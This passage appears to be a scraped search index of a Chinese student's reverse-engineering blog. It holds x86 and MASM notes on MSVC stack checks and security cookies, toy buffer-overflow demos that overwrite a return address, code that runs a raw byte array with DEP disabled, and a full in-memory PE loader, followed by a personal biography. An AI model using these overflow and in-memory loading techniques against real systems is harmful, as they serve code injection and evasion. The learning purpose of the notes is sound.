x=3.1415926;\tchar\tz=&#x27;I&#x27;;\tint y=(int)x;\tchar\tascii1=&#x27;O&#x27;;\tputs(&quot;Good!&quot;);\treturn 0;&#125; 1234567891011121314151617181920212223242526272829include Dqx.inc\tprintf proto C :ptr sbyte,:varargscanf proto C :ptr sbyte,:vararg.data\tn_input byte &quot;%d %d&quot;,0\tn_output\tbyte &quot;%d+%d=%d&quot;,10,0\ts_output\tBYTE &quot;%s&quot;,10,0\tstr1 byte &quot;welcome to my world&quot;,10 byte &quot;please input 2 NUm&quot;,0\ta dd\t0\tb dd\t0.codestart:\tinvoke\tprintf,addr s_output,addr str1\tinvoke\tscanf,addr n_input,addr a,addr b\tmov\teax,0\tadd\teax,a\tadd\teax,b\tinvoke\tprintf,addr n_output,a,b,eax INVOKE\tExitProcess,0;调用结束的函数,;--------------------------------------------------------------------------- end start 输入2个数字,然后相加 1234welcome to my worldplease input 2 NUm10 2010+20=30 windows下 C&#x2F;C++学习-调试x86count++ % 3 &#x3D;&#x3D; 0 吐了汇编翻译吐了 1234567891011/* count.c -- using standard I/O */#include &lt;stdio.h&gt;int main(int argc, char *argv[])&#123; while ((ch = getc(in)) != EOF) &#123; if (count++ % 3 == 0) ... &#125; return 0;&#125; 1234567891011121314151617181920212223242526272829303132333435363738//int版本mov ecx, [esp+1Ch]lea eax, [ecx+1]mov [esp+28], eaxmov edx, 55555556hmov eax, ecximul edxmov eax, ecxsar eax, 31sub edx, eaxmov eax, edxmov edx, eaxadd edx, edxadd edx, eaxmov eax, ecxsub eax, edxtest eax, eaxjnz short loc_4015A9//byte版本movzx ecx, byte ptr [esp+31]mov eax, ecxadd eax, 1mov [esp+31], almovsx ax, climul eax, 86shr ax, 8mov edx, eaxmov eax, ecxsar al, 7sub edx, eaxmov eax, edxmov edx, eaxadd edx, edxadd edx, eaxmov eax, ecxsub eax, edxtest al, aljnz short loc_4015AD 它的意思是 123456789101112131415#include &lt;stdio.h&gt;//byte版本int main(int argc, char *argv[])&#123; int result=0;//eax int count=6;//ecx, byte ptr [esp+31] result=count-3*((count*86)&gt;&gt;8-(count&gt;&gt;7)); return 0; &#125;//int版本/* int result=0; int count=10; result-=count-3*(count*0x55555556&gt;&gt;32-count&gt;&gt;31);*/ 我还是看不懂 ds:__iob_func__iob_func()返回一个指向FILE描述符数组的指针， 该数组包含stdin、stdout和通过 C 运行时库打开的stderr任何对象。 RTC_CheckEsp参数 ZF寄存器 它主要分布在一些函数调用之间, 也就是函数前mov esi,ebp 函数结束后就cmp esi,ebp 验证esp, stack, register 正确性的调用。调用它以确保esp在函数调用中保存 的值。 123450044EE35 mov esi,esp .....一些操作\t......0044EE4D cmp esi,esp 0044EE4F call @ILT+6745(__RTC_CheckEsp) (42BA5Eh) 在那一顿操作过后,他就检测栈是否还原 就是比较esi与esp 关于函数__RTC_CheckEsp1234567891011121314151617181920212223242526_RTC_CheckEsp:00475A60 jne esperror (475A63h) 00475A62 ret //如果相等就返回 //不相等就死了esperror:00475A63 push ebp 00475A64 mov ebp,esp 00475A66 sub esp,0 00475A69 push eax 00475A6A push edx 00475A6B push ebx 00475A6C push esi 00475A6D push edi 00475A6E mov eax,dword ptr [ebp+4] 00475A71 push 0 00475A73 push eax 00475A74 call _RTC_Failure (42C34Bh) 00475A79 add esp,8 00475A7C pop edi 00475A7D pop esi 00475A7E pop ebx 00475A7F pop edx 00475A80 pop eax 00475A81 mov esp,ebp 00475A83 pop ebp 00475A84 ret @__security_check_cookie基于Cookie的缓冲区溢出安全检查！ 这个Cookie的变量位于函数体内的局部变量和EBP的存放地址之间，具体表示就是：[EBP-4]。 __security_init_cookie()这个函数对__security_cookie变量再次初始化 123456//获取cooike变量//每个函数的ebp保持不变且不同,于是coike与ebp异或//把cooike压入ebp-4mov eax,dword ptr [___security_cookie (4B7A74h)]xor eax,ebpmov dword ptr [ebp-4],eax 关于cooike在栈中的位置 就是最开始压入EBP后ESP的值， ebp减4就刚好挨着一进函数时压入的EBP的地址减4。好了！Cookie变量已经在栈帧中了。 123.text:00991010 push ebp //这里是ebp位置.text:00991011 mov ebp, esp .text:00991013 sub esp, 13Ch //esp的开辟 12300F5FBA0 66DDC4AD //cooike00F5FBA4 00F5FBF4 Stack[000022C4]:00F5FBF4\t//ebp00F5FBA8 0099170F ___tmainCRTStartup+1BF 与EBP异或当然有好处。 可以增加随机性，尽可能使不同函数的安全Cookie都不同。 可以检查EBP是否被破坏，因为在函数结束检查Cookie时，还会将Cookie变量值再次与EBP异或，如果EBP的值没有变化，那么就能恢 复成原来的___security_cookie值。 一系列过程允许后又回到 123456//取出cokkie变量//还原cookie变量//检查是否和原来一样mov ecx,dword ptr [ebp-4]xor ecx,ebpcall @ILT+920(@__security_check_cookie@4) (43739Dh) 好像函数@__security_check_cookie@4采用了某个调用约定,所以的话ecx是第一个参数 1234567891011.text:00991220 ; void __fastcall __security_check_cookie(uintptr_t StackCookie)\t//某个调用约定.text:00991220 @__security_check_cookie@4 proc near ; CODE XREF: _main_0+153↑p.text:00991220 ; failwithmessage(void *,int,int,char const *)+208↓p ....text:00991220 cmp ecx, ___security_cookie //把参数于原始的cooike做一个比较.text:00991226 jnz short $failure$26820 //不相等就死翘翘.text:00991228 rep retn.text:0099122A ; ---------------------------------------------------------------------------.text:0099122A.text:0099122A $failure$26820: ; CODE XREF: __security_check_cookie(x)+6↑j.text:0099122A jmp ___report_gsfailure //到这里来了后就处理cooike不正常的处理.text:0099122A @__security_check_cookie@4 endp @_RTC_CheckStackVar顾名思义，就是用来检查局部数据是否访问越界。 相对来说， &#x3D;&#x3D;这种检查只能起到一定的作用&#x3D;&#x3D;，并不会所有越界访问都能检查到。 &#x3D;&#x3D;既然是检查局部的&#x3D;&#x3D;，那么在函数内定义的static类型数组或者函数外部的全局数组并不会采用此检查， &#x3D;&#x3D;既然是检查数组&#x3D;&#x3D;，那么如果函数内没有局部数组时，此检查也不会存在。 背景 在VS的debug版本下，局部变量之间并不是连续存放在栈内存里的 而是以4字节对齐的方式，前后都会有保护字节的。保护字节占4个字节，可能是值为0xcc，很明显这是汇编指令int 3中断的代码字节 原始代码void __fastcall _RTC_CheckStackVars( void *_Esp, _RTC_framedesc *_Fd ); 参数 ecx 原来函数的ebp edx\t一个fd结构体指针 参数传递 1234.text:0099114B mov ecx, ebp //参数1 ; Esp.text:0099114D push eax.text:0099114E lea edx, Fd\t//参数2.text:00991154 call @_RTC_CheckStackVars@8 关于fd结构体类型 1234567typedef struct _RTC_framedesc&#123; int varCount; // 要检查的数组的个数 _RTC_vardesc *variables; // 要检查的数组的相关信息&#125; _RTC_framedesc; 关于嵌套的结构体 _RTC_vardesc 1234567typedef struct _RTC_vardesc&#123; int addr; // 数组的首地址相对于EBP的偏移量 int size; // 数组的大小字节数 char *name; // 数组的名字&#125; _RTC_vardesc; 起反汇编代码 也不是很难….. 瞎看C代码–基于vs2008 123456789101112131415161718192021222324252627282930313233343536373839404142typedef struct _RTC_vardesc &#123; int addr; int size; char* name;&#125; _RTC_vardesc;typedef struct _RTC_framedesc &#123; int varCount; _RTC_vardesc* variables;\t//结构体指针&#125; _RTC_framedesc;void __fastcall _RTC_CheckStackVars( void* _Esp, _RTC_framedesc* _Fd )\t//ecx,edx&#123; if ( _Fd-&gt;varCount == 0 ) return; //如果数组个数是0,就不检测 int _RetAddr = 0; __asm &#123; mov eax, ebp add eax, 4 mov _RetAddr, eax // 保存返回地址 &#125; int i = 0; while ( i &lt; _Fd-&gt;varCount ) //i&lt;数组的个数 &#123; char* pAddr = ( char* )_Esp + _Fd-&gt;variables[i].addr - 4; if ( *( int* )pAddr != 0xcccccccc ) __asm int 3 // 引发中断 int ofs = _Fd-&gt;variables[i].addr + _Fd-&gt;variables[i].size; pAddr = ( char* )_Esp + ofs; if ( *( int* )pAddr != 0xcccccccc ) __asm int 3 // 引发中断 ++i; &#125;&#125; vs2010的IDA伪代码 12345678910111213141516171819202122void __fastcall _RTC_CheckStackVars(void *Esp, _RTC_framedesc *Fd)&#123; int v2; // edi _RTC_vardesc *variables; // eax int addr; // ecx int i; // [esp+Ch] [ebp-4h] void *retaddr; // [esp+14h] [ebp+4h] v2 = 0; for ( i = 0; i &lt; Fd-&gt;varCount; ++i ) &#123; variables = Fd-&gt;variables;\t//包含数组信息的结构体 addr = variables[v2].addr;\t//[index]小结构体的指针 //检测对应数组2边的保护字节????0xcc if ( *(_DWORD *)((char *)Esp + addr - 4) != 0xCCCCCCCC || *(_DWORD *)((char *)Esp + addr + variables[v2].size) != 0xCCCCCCCC ) &#123; _RTC_StackFailure(retaddr, variables[v2].name); &#125; ++v2; &#125;&#125; vs2008的汇编 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465.text:00991260 ; void __fastcall _RTC_CheckStackVars(void *Esp, _RTC_framedesc *Fd).text:00991260 @_RTC_CheckStackVars@8 proc near ; CODE XREF: _main_0+144↑p.text:00991260.text:00991260 var_4= dword ptr -4.text:00991260.text:00991260 mov edi, edi .text:00991262 push ebp.text:00991263 mov ebp, esp .text:00991265 push ecx.text:00991266 push ebx.text:00991267 push esi.text:00991268 push edi .text:00991269 xor edi, edi.text:0099126B mov esi, edx\t// 将_RTC_framedesc结构指针赋值给esi.text:0099126D mov ebx, ecx\t// 将函数的栈帧赋值给ebx.text:0099126F mov [ebp+var_4], edi\t// 这里的i应该是循环变量，后面根据数组的个数循环检测 .text:00991272 cmp [esi], edi //cmp fd,0 比较数值个数是否为0 .text:00991274 jle short loc_9912BE //没有数组,万事大吉,通过检测.text:00991276 jmp short loc_991280 //进一步检测.text:00991276 ; ---------------------------------------------------------------------------.text:00991278 align 10h.text:00991280.text:00991280 loc_991280: ; CODE XREF: _RTC_CheckStackVars(x,x)+16↑j.text:00991280 ; _RTC_CheckStackVars(x,x)+5C↓j.text:00991280 mov eax, [esi+4] // +4之后就是_RTC_framedesc.variables指针.text:00991283 mov ecx, [eax+edi] // _RTC_vardesc-&gt;addr了，就是数组的首地址相对于TestVars的EBP的偏.text:00991286 cmp dword ptr [ecx+ebx-4], 0CCCCCCCCh // 如果不等于0xcccccccc就报错_RTC_StackFailure.text:0099128E jnz short loc_99129F.text:00991290 mov edx, [eax+edi+4].text:00991294 add edx, ecx.text:00991296 cmp dword ptr [edx+ebx], 0CCCCCCCCh.text:0099129D jz short loc_9912B0.text:0099129F.text:0099129F loc_99129F: ; CODE XREF: _RTC_CheckStackVars(x,x)+2E↑j.text:0099129F mov ecx, [eax+edi+8] //即是_RTC_vardesc-&gt;name，用于报错提示.text:009912A3 mov edx, [ebp+4].text:009912A6 push ecx ; char * // 传入越界的数组名.text:009912A7 push edx ; void * // 传入edx=EBP+4的地址，此地址正是_RTC_CheckStackVars的返回地址，用于定位.text:009912A8 call ?_RTC_StackFailure@@YAXPAXPBD@Z ; _RTC_StackFailure(void *,char const *) // 调用此函数后，弹出异常MessageBox，提示哪个数组越界.text:009912AD add esp, 8.text:009912B0.text:009912B0 loc_9912B0: ; CODE XREF: _RTC_CheckStackVars(x,x)+3D↑j.text:009912B0 mov eax, [ebp+var_4] // 存在多个数组需要检查时有用.text:009912B3 inc eax.text:009912B4 add edi, 0Ch // 定位到下一个_RTC_vardesc结构.text:009912B7 mov [ebp+var_4], eax.text:009912BA cmp eax, [esi].text:009912BC jl short loc_991280.text:009912BE .text:009912BE loc_9912BE: ; CODE XREF: _RTC_CheckStackVars(x,x)+14↑j.text:009912BE pop edi.text:009912BF pop esi.text:009912C0 pop ebx.text:009912C1 mov esp, ebp.text:009912C3 pop ebp.text:009912C4 retn.text:009912C4 @_RTC_CheckStackVars@8 endp 基于数组缓冲区溢出修改ip1234567891011121314151617#include&lt;stdio.h&gt; void HelloWord() &#123; printf(&quot;Hello World&quot;); &#125; void Fun() &#123; int arr[5] = &#123;1,2,3,4,5&#125;; arr[6] = (int)HelloWord; &#125;\tint main()&#123;\tFun();\t&#125; //运行环境 devc++ x86 debug//代码可以打印出&quot;Hello World&quot; 数组只有5个,强行写了6个 数值最后一个元素在[ebp-4] 强行写的arr[6],超出来2个 arr[5]已经超出来,arr[5]是ebp,ebp里面存放了原来的ebp arr[6]已经超出来,arr[6]是ebp-4,ebp-4存放了push 进去的ip 现在ip被修改为了一个函数的地址 于是就可以运行 123456789101112push ebpmov ebp, espsub esp, 20hmov dword ptr [ebp-20], 1mov dword ptr [ebp-16], 2mov dword ptr [ebp-12], 3mov dword ptr [ebp-8], 4mov dword ptr [ebp-4], 5mov eax, offset __Z9HelloWordv ; HelloWord(void)mov [ebp+4], eaxleaveretn 缓冲区溢出修改其它变量用不休止的hello world 1234567891011121314151617#include&lt;stdio.h&gt;//exe会\t用不休止的hello world void Fun() &#123; int i; int arr[5] = &#123;0&#125;; for(i=0;i&lt;=5;i++) &#123; arr[i] = 0; puts(&quot;Hello World!...&quot;); &#125; &#125; int main()&#123;\tFun();\t&#125; 123456789101112131415161718192021222324 push ebp mov ebp, esp sub esp, 38h mov dword ptr [ebp-32], 0 mov dword ptr [ebp-28], 0 mov dword ptr [ebp-24], 0 mov dword ptr [ebp-20], 0 mov dword ptr [ebp-16], 0 mov dword ptr [ebp-12], 0 jmp short loc_40154D; ---------------------------------------------------------------------------loc_401532: ; CODE XREF: Fun(void)+51↓j mov eax, [ebp-12] mov dword ptr [ebp+eax*4-32], 0 mov dword ptr [esp], offset Buffer ; &quot;Hello World!...&quot; call _puts add [ebp+i], 1loc_40154D: ; CODE XREF: Fun(void)+30↑j cmp [ebp+i], 5 jle short loc_401532 leave retn 通过arr数组缓冲区溢出,修改了变量i,最后又再一次为0 gets内存越界内存越界 12345678910111213141516#include &lt;stdio.h&gt;int main( )&#123; char str[5]; char a; printf( &quot;Enter a value :&quot;); fgets( str,5,stdin ); //gets(str); printf( &quot;result: &quot;); puts( str ); printf(&quot;a: %c &quot;,a); return 0;&#125; 输出 1234Enter a value :123456789result:1234a: x 确定哪个call是主要的call比如 1int* ptr=(int*)calloc(1024,sizeof(int)); 跟进函数calloc 然后calloc函数里面可能还会有很多的call 于是你就看哪个call对eax,或者ptr做了修改,那么那个call就可能是主要的call x64printf参数1是rcx 参数2是rdx 参数3是r8f 参数4是r9d switch1.分支&lt;&#x3D;3的时候，用switch没有意义，因为编译器会生成类似if..else之类的反汇编 硬编码对于vs来说,修改一下项目属性 项目属性-&gt;链接器-&gt;高级-&gt;执行数据保护-&gt;取消 对于Dev来说,就不需要了,用gcc编译的字节码去 123456789101112131415161718#include &lt;stdio.h&gt;unsigned char code[] = &#123; 0x55, 0x89, 0xE5, 0x8B, 0x55, 0x08, 0x8B, 0x45, 0x0C, 0x01, 0xD0, 0x5D,0xc3&#125;;int add(int x, int y)&#123;\treturn x + y;&#125;int main() &#123;\tint (*pfun)(int, int) = (int(*)(int, int))&amp;code;\tint sum =pfun(1,2);\tprintf(&quot;%d&quot;, sum);\treturn 0;&#125; 对于vs,可以用gcc的字节码 对于gcc,不要用vs的字节码 vs有很多自带的,特殊的字节码,所以在vs里面就不要去调用那些字节码 PELAOD123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241.386.model flat,stdcalloption casemap:none include windows.incinclude msvcrt.incinclude user32.incinclude kernel32.inc includelib msvcrt.libincludelib user32.libincludelib kernel32.lib .dataIMAGE_SIZE equ 2000h ;程序加载更改项 .constg_fileName db &quot;helloPe.exe&quot;,0 ;程序加载更改项 .codeorg IMAGE_SIZE - 1000h ;这里减1000是程序本身具有头文件可以不拷贝，直接利用 checkPE proc lpAddress:LPVOID mov esi,lpAddress assume esi : ptr IMAGE_DOS_HEADER .if [esi].e_magic != &#x27;ZM&#x27; mov eax,0 ret .endif ;指向PE文件头 add esi,[esi].e_lfanew assume esi : ptr IMAGE_NT_HEADERS .if[esi].Signature !=&#x27;EP&#x27; mov eax,0 ret .endif retcheckPE endp LoadPe proc uses esi ebx edi hMod:HMODULE LOCAL @hFile:HANDLE LOCAL @hMap:HANDLE LOCAL @lpAddress:LPVOID LOCAL @NumberOfSections:dword ;节区表数量 LOCAL @SizeOfOptional:dword ;可选头大小 LOCAL @AddrOfEntryPoint:dword;程序执行入口 LOCAL @SizeOfImage:dword;所有头部加节表大小 LOCAL @SizeOfHeaders:dword;头部占空间的大小 LOCAL @dwOld:dword LOCAL @SectionAddr:dword LOCAL @importAddr:dword LOCAL @zeroIDD :IMAGE_DATA_DIRECTORY LOCAL @DllhMod:HMODULE invoke RtlZeroMemory, addr @zeroIDD,sizeof IMAGE_DATA_DIRECTORY ;设置全0结构体检测地址是否为0 ;读取文件 invoke CreateFile,offset g_fileName,GENERIC_READ,FILE_SHARE_READ,0,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,0 .if eax==INVALID_HANDLE_VALUE jmp DISPOSE_ERROR .endif mov @hFile,eax ;创建内存位图 invoke CreateFileMapping,@hFile,NULL,PAGE_READONLY,0,0,NULL .if eax==NULL jmp DISPOSE_ERROR .endif mov @hMap,eax ;位图映射到进程,复制可执行文件的头部到PE装载器申请内存的首地址 invoke MapViewOfFile,@hMap,FILE_MAP_READ,0,0,0 .if eax==NULL jmp DISPOSE_ERROR .endif mov @lpAddress,eax ;检查PE的头文件格式是否合法 invoke checkPE,@lpAddress .if eax ==NULL jmp DISPOSE_ERROR .endif mov esi,@lpAddress assume esi : ptr IMAGE_DOS_HEADER ;需要拿到的属性filehead 的可选头大小，节区表数量，需要optionhead里AddressOfEntryPoint ;SizeOfHeaders add esi,[esi].e_lfanew assume esi : ptr IMAGE_NT_HEADERS movzx eax,[esi].FileHeader.NumberOfSections mov @NumberOfSections,eax movzx eax,[esi].FileHeader.SizeOfOptionalHeader mov @SizeOfOptional,eax mov eax,[esi].OptionalHeader.AddressOfEntryPoint ;拿到程序入口点地址 mov @AddrOfEntryPoint,eax mov eax,[esi].OptionalHeader.SizeOfImage ;拿到头部+节区表的总长度 mov @SizeOfImage,eax mov eax,[esi].OptionalHeader.SizeOfHeaders mov @SizeOfHeaders,eax ;这里获取导入表的地址,等于导入信息表的下标1*结构体的大小 lea eax,[esi].OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT * sizeof IMAGE_DATA_DIRECTORY] mov @importAddr,eax ;拷贝可执行文件的头部到当前文件的模块载入地址 ;更改代码段的属性 invoke VirtualProtect,hMod,@SizeOfImage,PAGE_EXECUTE_READWRITE,addr @dwOld invoke crt_memcpy, hMod, @lpAddress,@SizeOfHeaders .if eax==NULL jmp DISPOSE_ERROR .endif ;5 复制区块表的相关数据到PE装载器申请内存的相应地址,注意：记得加模块偏移 lea esi,[esi].OptionalHeader add esi,@SizeOfOptional ;拿到了区块表的起始地址 mov @SectionAddr,esi ;转换esi地址为IMAGE_SECTION_HEADER结构体 mov esi,@SectionAddr assume esi:ptr IMAGE_SECTION_HEADER xor ecx,ecx .while ecx&lt;@NumberOfSections .if [esi].SizeOfRawData!=0 ;首先判断文件偏移是否为0，为0是未初始化的节区 mov eax,[esi].PointerToRawData ;文件的偏移加文件在内存中的基地址得到文件区块的起始位置 add eax,@lpAddress ;在文件中的偏移加文件的基地址 mov edi,[esi].VirtualAddress;文件在内存中映射的位置 add edi,hMod ;在内存中的偏移加内存中的基地址 invoke crt_memcpy ,edi,eax,[esi].SizeOfRawData .if eax ==NULL jmp DISPOSE_ERROR .endif .endif inc ecx add esi,sizeof IMAGE_SECTION_HEADER .endw ;加载导入表信息 mov esi,@importAddr mov esi,dword ptr[esi] add esi,hMod assume esi:ptr IMAGE_IMPORT_DESCRIPTOR invoke crt_memcmp,esi,addr @zeroIDD,sizeof @zeroIDD .while eax!=0 mov eax,[esi].FirstThunk add eax ,hMod .if dword ptr [eax] != 0 ;IAT表不为空 mov ebx,[esi].OriginalFirstThunk .if ebx == 0 mov ebx,[esi].FirstThunk .endif add ebx,hMod ;不管是IAT表为空还是INT表为空，值都会保存在Ebx mov edi,[esi].FirstThunk add edi,hMod ;edi得到iat的位置 mov eax,[esi].Name1 add eax,hMod ;获取模块的名称 push ecx invoke LoadLibrary,eax pop ecx mov @DllhMod,eax mov ecx,0 .while dword ptr[ebx+ecx*4] !=0 mov eax,[ebx+ecx*4] .if eax&amp;80000000h ;序号导入 and eax,0ffffh ;拿到了低4位的值 .else ;名称导入 add eax,hMod assume eax:ptr IMAGE_IMPORT_BY_NAME lea eax,[eax].Name1 .endif ;此时eax保存了序号或者函数名 push ecx invoke GetProcAddress, @DllhMod,eax pop ecx mov [edi+ecx*4],eax inc ecx .endw .endif add esi,sizeof IMAGE_IMPORT_DESCRIPTOR invoke crt_memcmp,esi,addr @zeroIDD,sizeof @zeroIDD .endw ;跳转到程序入口点 mov eax,hMod add @AddrOfEntryPoint,eax call @AddrOfEntryPoint DISPOSE_ERROR: .if @lpAddress !=NULL invoke UnmapViewOfFile,@lpAddress .endif .if @hMap!=NULL invoke CloseHandle,@hMap .endif .if @hFile!=INVALID_HANDLE_VALUE invoke CloseHandle,@hFile .endif retLoadPe endp START: ;获取程序载入模块的确切地址 invoke GetModuleHandle,NULL invoke LoadPe,eax invoke ExitProcess,0end START","tags":["Assembly","x86"],"categories":["Language"]},{"title":"关于我","path":"/re4mile/about/index.html","content":"位置坐标四川 达州人 渠县 人 家住:三汇 汇南乡 快活村 9年义务教育我硬是把9年过成了12年,甚至&gt;12年 小学一共有3批小学同学 首次在村里开始上学小学幼儿园就在快活村,呆了可能n年,这个n估计小于4吧 听奶奶说我读了6个幼儿园,我自己都不信 我只记得我在快活村读了差不多3年吧 可以说还是有一段美好的会议 然后至于这3年,我是读的几年级…都忘记了, 可能是1年级, 也可能是2年级, 或者是幼儿园🤣 但是总有一些小学同学记忆有些,还有一些长得很好看的小学同学 但是我只能把他们归类为第一批小学同学 去往深圳后来我去深圳上学了,可以说是去父母那里上学 在甚至我从一年级开始上起,,,,那肯定是留级呀,,,我好歹也是外地过来上学 ps: 我很怀恋那段深圳上学的时光 在深圳上学,和很多城里的孩子玩,过着城里人的生活 然后我记得,那是学校发的校服 男生: 西服,胸口打蝴蝶结,而我那时不会打蝴蝶结…哎 女生: 穿裙子,那种校服的裙子 只能说很怀恋 在深圳,我读了大概3-4年吧, 成绩可以说是差的生,,,也就是从村里去城里读书,我一直都是差等生 然后在深圳的回忆也是蛮多的 1). 关于我偷钱买零食 2). 关于我去小卖部偷零食,还被逮住,然后店老板罚站 3). 关于我偷钱被父母抓,爸爸用单车的刹车线打我,没打一下,都会落下红色的印记,打完了,还不忘买药给我擦,..笑死 4). 关于我干爹给我买了一个方程式遥控赛车,我拿它把水盆撞坏了 5). 关于我在深圳认了一个爷爷,原因是:我认错人了…. 6). 关于我放学去班上同学的出题筹集矿泉水瓶,然后去废品站卖钱买零食…. …. 慢慢的回忆吧….很多…另外当然还有一个小学的基友和我一起干坏事啦 再次回到村里后来不知道什么原因,我在深圳应该读到了3年级,然后村里了 原因: 1). 可能是成绩太差了 2). 可能是不让外地人在当地读书了 3). … 首先我就已经有了2批小学同学了: 一起村里那批,现在深圳那批 然后回到快活村小学,我应该上4年级 然后…🤣笑死 从一年级开始读书….从零开始 然后又认识了一批小学同学,我现在有3批小学同学了 于是我开始从一年级读书 这这里我读完了6年的小学 在这6年: 1). 偷东西的习惯慢慢的改掉了,但是,,,偶尔忍不住又去偷东西 2). 小学成绩慢慢的变好了,毕竟在村里读书,,, 3). 早恋过.叛逆过,疯狂过 早恋的话, 在1年级早恋过,认识了一个一个女孩,一个真的很巧的女孩 在5年级或者6年级早恋过,,,, 反正都是我喜欢别人,别人不喜欢我,还干了很多傻事,比如写情书..🤣 疯狂过: 我记得我和几位玩得很好的同学在厕所里面 拜把子人兄弟,不求同年同月同日生,只求同年同月同日死…🤣笑死 记得冬天,和屯里的一些同学去河里洗澡,woc,真不怕冷 当然洗澡被班主任抓过,因为我是班长,然后班主任问打几个屁股 我说打3个,还是5个来着 然后记得打到第几个屁股来着,,,我的鼻涕直接在打下那一刻,冒泡了,喷涌而出🤣 …… 小学6年,成绩一直还是不差,不能说优秀 另外,我小学只有13个同学,,毕竟村里读书,人少 初中后来,小学升初中 和我一起去参加初中资格考试的有3位 结果只有我一个人考上,然后后来参加的一位没考上,交了钱(议价) 🤣笑死…. 我们当时报考的是镇里比较有名的私立学校(达州外国语学校) 认识了很多值得深交的同学其实初中,我后悔没有好好的玩,,, 高中大学大一大二大三大四家庭状况"},{"title":"Re小项目","path":"/re4mile/wiki/Re小项目/index.html","content":"start简单说一下这个页面时干嘛的 这个页面是默认显示的主页面 也就是index.md 但是我们可以往里面写入内容 我觉得可以写一些介绍的语句 类似于对当前项目的一些文章介绍 然后这个页面自动会有toc tree,我们都不用设置的"},{"title":"C语言小项目","path":"/re4mile/wiki/C语言小项目/index.html","content":"start简单说一下这个页面时干嘛的 这个页面是默认显示的主页面 也就是index.md 但是我们可以往里面写入内容 我觉得可以写一些介绍的语句 类似于对当前项目的一些文章介绍 然后这个页面自动会有toc tree,我们都不用设置的"},{"title":"关于我","path":"/re4mile/wiki/关于我/index.html","content":"start简单说一下这个页面时干嘛的 这个页面是默认显示的主页面 也就是index.md 但是我们可以往里面写入内容 我觉得可以写一些介绍的语句 类似于对当前项目的一些文章介绍 然后这个页面自动会有toc tree,我们都不用设置的"},{"title":"汇编小项目","path":"/re4mile/wiki/汇编小项目/index.html","content":"start简单说一下这个页面时干嘛的 这个页面是默认显示的主页面 也就是index.md 但是我们可以往里面写入内容 我觉得可以写一些介绍的语句 类似于对当前项目的一些文章介绍 然后这个页面自动会有toc tree,我们都不用设置的"},{"title":"win32汇编实现任意进制转化","path":"/re4mile/wiki/汇编小项目/汇编进制转化.html","content":"参考链接https://blog.csdn.net/huangxy10/article/details/8310087 https://www.cnblogs.com/cloudeman/archive/2012/04/09/2439438.html 其实也就是我们在汇编语言中,可以调用很多C语言的函数 比如下面涉及的函数 123stdio.hstdlib.hstring.h 常用的CRT函数 123456789crt_memcpycrt_memsetcrt_strcpycrt_systemcrt_printfcrt_scanfcrt_fopencrt_gets... 其实涉及的很多的函数例子你就都可以加上crt_前缀,然后尝试一下可不可以正常使用该函数 能用,当然就万事大吉啦 实践"},{"title":"博客链接","path":"/re4mile/wiki/博客链接/index.html","content":"start简单说一下这个页面时干嘛的 这个页面是默认显示的主页面 也就是index.md 但是我们可以往里面写入内容 我觉得可以写一些介绍的语句 类似于对当前项目的一些文章介绍 然后这个页面自动会有toc tree,我们都不用设置的"}]